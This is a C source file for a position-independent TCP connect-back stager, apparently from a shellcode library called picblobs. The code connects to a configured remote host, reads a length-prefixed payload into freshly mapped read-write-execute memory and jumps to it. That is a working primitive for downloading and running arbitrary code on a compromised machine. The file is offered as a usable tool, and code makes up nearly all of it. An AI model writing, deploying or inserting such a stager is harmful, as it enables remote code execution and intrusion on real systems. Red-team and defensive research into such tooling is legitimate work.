/*
 * stager_tcp — TCP connect-back stager.
 *
 * Connects to a remote host, reads a length-prefixed payload,
 * allocates RWX memory, copies the payload, and jumps to it.
 *
 * Config layout (7 bytes, packed):
 *   +0x00: address family (u8, AF_INET=2)
 *   +0x01: port (u16, little-endian — converted to network order)
 *   +0x03: IPv4 address (4 bytes, network order)
 *
 * Wire protocol:
 *   Server sends: payload_size (u32 LE) + payload_data
 */

#include "picblobs/cache.h"
#include "picblobs/net.h"
#include "picblobs/os/linux.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/sys/close.h"
#include "picblobs/sys/connect.h"
#include "picblobs/sys/exit_group.h"
#include "picblobs/sys/mmap.h"
#include "picblobs/sys/mprotect.h"
#include "picblobs/sys/read.h"
#include "picblobs/sys/socket.h"

/* Config struct (packed — no padding between af and port). */
struct __attribute__((packed)) stager_tcp_config {
	pic_u8 af;	/* AF_INET = 2 */
	pic_u16 port;	/* little-endian, converted to network order */
	pic_u8 addr[4]; /* IPv4 address, network order */
};

/*
 * ASM config anchor.
 */
__asm__(".section .config,\"aw\"\n"
	".globl stager_tcp_config\n"
	"stager_tcp_config:\n"
	".space 7\n"
	".previous\n");

PIC_TEXT
static long read_all(int fd, void *buf, pic_size_t count)
{
	pic_u8 *p = (pic_u8 *)buf;
	pic_size_t done = 0;
	while (done < count) {
		long n = pic_read(fd, p + done, count - done);
		if (n <= 0) {
			return -1;
		}
		done += (pic_size_t)n;
	}
	return (long)done;
}

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	extern char stager_tcp_config[] __attribute__((visibility("hidden")));
	const struct stager_tcp_config *cfg =
		(const struct stager_tcp_config *)(void *)stager_tcp_config;

	/* Create TCP socket. */
	int fd = (int)pic_socket(cfg->af, PIC_SOCK_STREAM, 0);
	if (fd < 0) {
		pic_exit_group(1);
	}

	/* Build sockaddr_in. */
	struct pic_sockaddr_in sa;
	pic_u8 *p = (pic_u8 *)&sa;
	for (int i = 0; i < (int)sizeof(sa); i++) {
		p[i] = 0;
	}
	sa.sin_family = (pic_u16)cfg->af;
	/* Port is little-endian in config. Read bytes and convert to
	 * network order without relying on native struct field access
	 * (which would misinterpret the bytes on big-endian arches). */
	const pic_u8 *cfg_bytes = (const pic_u8 *)cfg;
	pic_u16 port_le = (pic_u16)cfg_bytes[1] | ((pic_u16)cfg_bytes[2] << 8);
	sa.sin_port = pic_htons(port_le);
	/* IPv4 address is already in network order. */
	sa.sin_addr = *(pic_u32 *)cfg->addr;

	/* Connect. */
	if (pic_connect(fd, &sa, sizeof(sa)) < 0) {
		pic_close(fd);
		pic_exit_group(1);
	}

	/* Read payload size (4 bytes, little-endian). */
	pic_u8 size_buf[4];
	if (read_all(fd, size_buf, 4) < 0) {
		pic_close(fd);
		pic_exit_group(1);
	}
	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);

	if (size == 0 || size > 0x10000000) {
		pic_close(fd);
		pic_exit_group(1);
	}

	/* Allocate RWX memory. */
	void *mem = pic_mmap(PIC_NULL, (pic_size_t)size,
		PIC_PROT_READ | PIC_PROT_WRITE | PIC_PROT_EXEC,
		PIC_MAP_PRIVATE | PIC_MAP_ANONYMOUS, -1, 0);
	if ((long)mem == -1) {
		pic_close(fd);
		pic_exit_group(1);
	}

	/* Read payload data. */
	if (read_all(fd, mem, (pic_size_t)size) < 0) {
		pic_close(fd);
		pic_exit_group(1);
	}

	pic_close(fd);
	pic_sync_icache(mem, (pic_size_t)size);

	/* Jump to payload.
	 * On ARM Thumb, set LSB of address to stay in Thumb mode. */
#if defined(__thumb__)
	((void (*)(void))((pic_uintptr)mem | 1))();
#else
	((void (*)(void))mem)();
#endif

	pic_exit_group(0);
}
